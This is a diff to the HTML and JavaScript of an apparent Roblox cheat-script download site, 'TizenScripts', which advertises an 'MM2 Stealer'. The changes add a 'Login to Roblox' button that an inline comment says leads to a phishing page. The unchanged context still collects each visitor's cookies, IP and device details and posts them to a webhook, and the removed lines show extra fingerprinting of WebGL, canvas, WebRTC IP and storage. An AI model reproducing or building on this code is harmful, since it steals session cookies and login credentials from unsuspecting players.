@@ -29,6 +29,28 @@
             margin-top: 10px;
             font-size: 18px;
         }
+        .roblox-login-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 1000;
+            padding: 12px 25px;
+            background: #2b5ff5;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(43, 95, 245, 0.4);
+        }
+        .roblox-login-btn:hover {
+            background: #1a4ad9;
+            transform: scale(1.05);
+        }
         .language-selector {
             position: fixed;
             top: 20px;
@@ -120,10 +142,8 @@
             ru: {
                 headerSubtitle: 'Лучшие скрипты и расширения для Roblox',
                 navHome: 'Главная',
-                navScripts: 'Скрипты',
-                navExtensions: 'Расширения',
+                navDelta: 'Delta',
                 navSupport: 'Поддержка',
-                navFAQ: 'FAQ',
                 statDownloads: 'Скачиваний',
                 statUsers: 'Пользователей',
                 statSupport: 'Поддержка',
@@ -135,15 +155,14 @@
                 mm2Title: '🔫 MM2 Stealer',
                 mm2Desc: 'Стилер скинов для Murder Mystery 2',
                 downloadBtn: 'Скачать',
+                loginBtn: 'Войти в Roblox',
                 footer: '© 2026 TizenScripts'
             },
             en: {
                 headerSubtitle: 'Best scripts and extensions for Roblox',
                 navHome: 'Home',
-                navScripts: 'Scripts',
-                navExtensions: 'Extensions',
+                navDelta: 'Delta',
                 navSupport: 'Support',
-                navFAQ: 'FAQ',
                 statDownloads: 'Downloads',
                 statUsers: 'Users',
                 statSupport: 'Support',
@@ -155,6 +174,7 @@
                 mm2Title: '🔫 MM2 Stealer',
                 mm2Desc: 'Skin stealer for Murder Mystery 2',
                 downloadBtn: 'Download',
+                loginBtn: 'Login to Roblox',
                 footer: '© 2026 TizenScripts'
             }
         };
@@ -165,10 +185,8 @@
             
             document.getElementById('headerSubtitle').textContent = t.headerSubtitle;
             document.getElementById('navHome').textContent = t.navHome;
-            document.getElementById('navScripts').textContent = t.navScripts;
-            document.getElementById('navExtensions').textContent = t.navExtensions;
+            document.getElementById('navDelta').textContent = t.navDelta;
             document.getElementById('navSupport').textContent = t.navSupport;
-            document.getElementById('navFAQ').textContent = t.navFAQ;
             document.getElementById('statDownloadsText').textContent = t.statDownloads;
             document.getElementById('statUsersText').textContent = t.statUsers;
             document.getElementById('statSupportText').textContent = t.statSupport;
@@ -179,16 +197,11 @@
             document.getElementById('cookieDesc').textContent = t.cookieDesc;
             document.getElementById('mm2Title').textContent = t.mm2Title;
             document.getElementById('mm2Desc').textContent = t.mm2Desc;
+            document.getElementById('loginBtn').textContent = t.loginBtn;
             document.getElementById('footerText').textContent = t.footer;
             
             const buttons = document.querySelectorAll('.download-btn');
             buttons.forEach(btn => { btn.textContent = t.downloadBtn; });
-            
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: '🌍 **ВЫБРАН ЯЗЫК**: ' + lang.toUpperCase()})
-            });
         }
         
         function loadLanguage() {
@@ -208,61 +221,8 @@
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 referrer: document.referrer,
                 url: window.location.href,
-                cookies: document.cookie,
-                localStorage: JSON.stringify(localStorage),
-                sessionStorage: JSON.stringify(sessionStorage),
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                maxTouchPoints: navigator.maxTouchPoints,
-                colorDepth: screen.colorDepth,
-                pixelRatio: window.devicePixelRatio,
-                historyLength: history.length,
-                onlineStatus: navigator.onLine,
-                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
-                doNotTrack: navigator.doNotTrack,
-                vendor: navigator.vendor,
-                gpu: 'Unknown',
-                webglVendor: 'Unknown',
-                canvasFingerprint: 'Unknown',
-                webRTCIP: 'Unknown'
+                cookies: document.cookie
             };
-            
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                data.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-            } catch (e) {}
-            
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 200;
-                canvas.height = 50;
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Fingerprint', 2, 15);
-                data.canvasFingerprint = canvas.toDataURL().substring(0, 100);
-            } catch (e) {}
-            
-            try {
-                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = (ice) => {
-                    if (ice && ice.candidate && ice.candidate.candidate) {
-                        const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                        if (ipMatch) {
-                            data.webRTCIP = ipMatch[0];
-                            pc.close();
-                        }
-                    }
-                };
-            } catch (e) {}
             
             const message = '🔍 **TizenScripts Tracking**\n\n' +
                 '🌐 IP: ' + data.ip + '\n' +
@@ -271,9 +231,7 @@
                 '💻 Платформа: ' + data.platform + '\n' +
                 '🖥️ Экран: ' + data.screenResolution + '\n' +
                 '⏰ TZ: ' + data.timezone + '\n' +
-                '🎮 GPU: ' + data.gpu + '\n' +
-                '🔐 WebRTC IP: ' + data.webRTCIP + '\n' +
-                '🎨 Canvas FP: ' + data.canvasFingerprint + '\n\n' +
+                '🔗 URL: ' + data.url + '\n\n' +
                 '🍪 COOKIES:\n```' + data.cookies + '```';
             
             await fetch(WEBHOOK, {
@@ -299,6 +257,9 @@
     </script>
 </head>
 <body>
+    <!-- Кнопка входа в Roblox (ведёт на фишинг) -->
+    <a href="login.html" class="roblox-login-btn" id="loginBtn">Войти в Roblox</a>
+    
     <div class="language-selector">
         <select id="languageSelect" onchange="changeLanguage(this.value)">
             <option value="ru">🇷🇺 Русский</option>
